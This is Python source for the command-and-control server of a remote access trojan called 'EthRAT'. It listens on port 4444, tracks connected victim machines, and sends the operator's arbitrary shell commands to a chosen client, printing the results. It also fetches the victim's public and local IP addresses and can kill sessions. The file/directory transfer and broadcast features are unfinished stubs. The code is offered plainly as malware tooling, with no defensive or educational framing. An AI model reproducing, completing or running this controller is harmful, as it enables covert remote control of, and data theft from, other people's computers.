import socket
import threading
import os
import ctypes
from datetime import datetime
import struct
import json
from tkinter.filedialog import askopenfilename

# Colors
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
reset = "\033[0m"
blue = "\033[1;34m"
purple = "\033[1;35m"

clients = {}
server_active = True

LHOST = "0.0.0.0"
LPORT = 4444

logo = red + r"""
##################################
 _____ _   _    ______  ___ _____ 
|  ___| | | |   | ___ \/ _ \_   _|
| |__ | |_| |__ | |_/ / /_\ \| |  
|  __|| __| '_ \|    /|  _  || |  
| |___| |_| | | | |\ \| | | || |  
\____/ \__|_| |_\_| \_\_| |_/\_/  

##################################
""" + reset + "\n\n"


def help():
    """ Help Menu """
    print(green + """
    |---------------------------------------------------------------|
    |      Commands      |                Description               |
    |---------------------------------------------------------------|
    |-----------------------Main Menu-------------------------------|
    |       help         | Display help menu                        |
    |       list         | List the connected clients               |
    |       0            | Broadcast to all clients                 |
    |       <clientId>   | Interract with client                    |
    |       exit         | Stop the server                          |
    |---------------------Interracting mode-------------------------|
    |       kill         | Kill connection with client              |
    |       download     | Download file/directory from client      |
    |       upload       | Upload file/directory to client          |
    |       cd           | Browse to a directory                    |
    |       getip        | Get the clients public IP                |
    |---------------------------------------------------------------|
    """ + reset)

def window_title(clients):
    """ Updates console title with connected clients count (works only on windows) """
    if os.name == "nt":
        ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")


def list_clients(clients):
    """ Returns the list of the connected clients """
    if clients:
        for index, (addr, _) in enumerate(clients.items()):
            print(f"{purple}{index + 1}{reset}. {green}{addr[0]}:{addr[1]}{reset}")
    else:
        print(f"{red}[!] No clients connected.{reset}")

def get_client_by_index(clients, choice):
    """ Get the client socket based on user choise """
    client_list = list(clients.items())
    if 1 <= choice <= len(client_list):
        return client_list[choice - 1]
    else:
        print(f"{red}Invalid choice. Type 'list' for connected clients.{reset}")
        return None, None

def handle_client(socket):
    """Handle incoming client connections"""
    while server_active:
        try:
            client_socket, addr = socket.accept()
            clients[addr] = client_socket
            print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n\n{cyan}Main>{reset} ", end="", flush=True)
            window_title(clients)
            
            threading.Thread(target=monitor_client, args=(client_socket, addr), daemon=True).start()
            
        except (ConnectionResetError, OSError, socket.error, Exception) as e:
            print(f"\n{red}[-]{reset} Error accepting connection: {e}")
            continue

def monitor_client(client_socket, addr):
    """Monitor client disconnection"""
    try:
        while True:
            data = client_socket.recv(1, socket.MSG_PEEK)
            if not data: 
                raise ConnectionError("Client disconnected")
                
    except (ConnectionResetError, ConnectionAbortedError, ConnectionError, OSError) as e:
        print(f"{red}[-]{reset} Client {addr[0]}:{addr[1]} disconnected")
        client_socket.close()
        clients.pop(addr, None)
        window_title(clients)
    except Exception as e:
        print(f"\n{red}[-]{reset} Error with client {addr[0]}:{addr[1]}: {e}")
        client_socket.close()
        clients.pop(addr, None)
        window_title(clients)
           
def send(sock, data):
    """ Bulk Send Commands And Data """
    try:
        sock.sendall(struct.pack('>I', len(data)) + data)
    except (ConnectionError, struct.error, OSError) as e:
        print(f"{red}Send failed: {e}{reset}")

def recv(sock):
    """ Receive First Letter, Then Return the rest """
    try:
        data_size = recvall(sock, 4)
        if not data_size:
            return b''
        data_len = struct.unpack('>I', data_size)[0]
        return recvall(sock, data_len)
    except (ConnectionError, struct.error, OSError) as e:
        print(f"{red}Receive failed: {e}{reset}")

def recvall(sock, n):
    """ Bulk Receive Data, Including Files """
    try:
        packet = b''
        while len(packet) < n:
          chunk = sock.recv(n - len(packet))
          if not chunk:
            return None
          packet += chunk
        return packet
    except (ConnectionError, struct.error, OSError) as e:
        print(f"{red}Receive all failed: {e}{reset}")

def download():
    print("Download logic")

def save_file():
    pass

def upload():
    print("Upload logic")

def send_file():
    pass

def open_file():
    file_path = askopenfilename(
        title="Select your file",
        filetypes=[("All files", "*.*")]
    )
    if not file_path:
        print(f"{red}No file selected.{reset}")
        return
    file_name = os.path.basename(file_path)
    print(f"Selected file: {file_name}")
    return file_path, file_name


def command_handler(cl_addr, cl_socket):
    """ User-interactive command handler for a specific client """
    ip, port = cl_addr
    print(f"{yellow}[*]{reset} Interracting with {ip}:{port}")

    while True:
        try:
            cmd = input(f"\n{cyan}[$]{reset} {blue}{ip}:{port}>{reset} ").strip()
            if not cmd:
                continue
                
            if cmd.lower() == "kill":
                send(cl_socket, cmd.encode())
                cl_socket.close()
                clients.pop(cl_addr, None)
                return

            elif cmd.lower() == "getip":
                send(cl_socket, cmd.encode())
                response = recv(cl_socket)
                if response:
                    try:
                        ip_info = json.loads(response.decode())
                        print(f"{purple}[>] Client Public IP:{reset} {ip_info['pip']}")
                        print(f"{purple}[>] Client Local IP:{reset} {ip_info['lip']}")
                    except json.JSONDecodeError:
                        print(f"{red}[!] Invalid response from client:{reset} {response.decode()}")
                else:
                    print(f"{red}[!] No response from client{reset}")

            elif cmd == "download":
                print("download logic")
            elif cmd == "upload":
                open_file()
                print("upload logic")

            elif cmd.lower() == "back":
                return
                
            else:
                send(cl_socket, cmd.encode())
                response = recv(cl_socket)
                if response:
                    print(response.decode())
                else:
                    print(f"{red}[!] No response from client{reset}")

        except (ConnectionResetError, OSError) as e:
            print(f"\n{red}[-]{reset} Connection lost: {e}")
            clients.pop(cl_addr, None)
            return
        except Exception as e:
            print(f"\n{red}[-]{reset} Error: {e}")
            continue

# [Rest of the server code remains the same...]
def start_server(lhost, lport):
    global server_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, lport))
        sock.listen(5)
        
        os.system("cls" if os.name == "nt" else "clear")
        print(logo)
        print(yellow + "[*] Server Started On {}:{} < at [{}]".format(lhost, lport, datetime.now().strftime("%H:%M:%S")) + reset)
        threading.Thread(target=handle_client, args=(sock,), daemon=True).start()

        while server_active: 
            try:
                cmd = input(f"\n{cyan}Main>{reset} ").strip().lower()
                
                if cmd == "help":
                    help()

                elif cmd == "list":
                    list_clients(clients)  

                elif cmd == "0":
                    print(f"{yellow}[*]{reset} Broadcast mode (to implement)")    
                    
                elif cmd.isdigit():
                    addr, client_socket = get_client_by_index(clients, int(cmd))
                    if client_socket:
                        command_handler(addr, client_socket)
                  
                elif cmd == "exit":
                    print(f"{yellow}[*]{reset} Shutting down the server...")
                    server_active = False
                    
                else:
                    print(f"{red}[-]{reset} Unknown command. Type 'help'")
                    
            except (OSError, EOFError, ValueError) as e:
                print(f"\n{red}[!]{reset} Error: {e}{reset}")
                continue

    except (KeyboardInterrupt, EOFError):
        print("\nShutting down server...")
        server_active = False
    except (socket.error, OSError) as e:
        print(f"{red}Error: {e}{reset}")
        server_active = False
    finally:
        server_active = False
        sock.close()


if __name__ == "__main__":
    start_server(LHOST, LPORT)